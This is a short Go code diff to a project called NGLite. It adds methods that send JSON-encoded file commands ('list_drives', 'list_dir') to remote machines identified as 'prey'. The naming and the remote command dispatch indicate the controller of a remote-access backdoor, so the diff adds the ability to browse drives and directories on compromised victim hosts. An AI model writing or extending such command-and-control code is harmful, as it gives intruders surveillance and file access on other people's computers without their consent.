@@ -3,6 +3,7 @@ package core
 import (
 	"NGLite/internal/transport"
 	"NGLite/module/cipher"
+	"encoding/json"
 	"fmt"
 	"time"
 
@@ -60,5 +61,31 @@ func (cd *CommandDispatcher) SendCommand(preyID, command string) (string, error)
 	case <-time.After(30 * time.Second):
 		return "", fmt.Errorf("command execution timeout")
 	}
+}
+
+func (cd *CommandDispatcher) SendFileCommand(preyID, action string, params map[string]interface{}) (string, error) {
+	cmd := map[string]interface{}{
+		"action": action,
+	}
+	for k, v := range params {
+		cmd[k] = v
+	}
+	
+	cmdJSON, err := json.Marshal(cmd)
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal command: %w", err)
+	}
+	
+	return cd.SendCommand(preyID, string(cmdJSON))
+}
+
+func (cd *CommandDispatcher) ListDrives(preyID string) (string, error) {
+	return cd.SendFileCommand(preyID, "list_drives", nil)
+}
+
+func (cd *CommandDispatcher) ListDirectory(preyID, path string) (string, error) {
+	return cd.SendFileCommand(preyID, "list_dir", map[string]interface{}{
+		"path": path,
+	})
 }
 
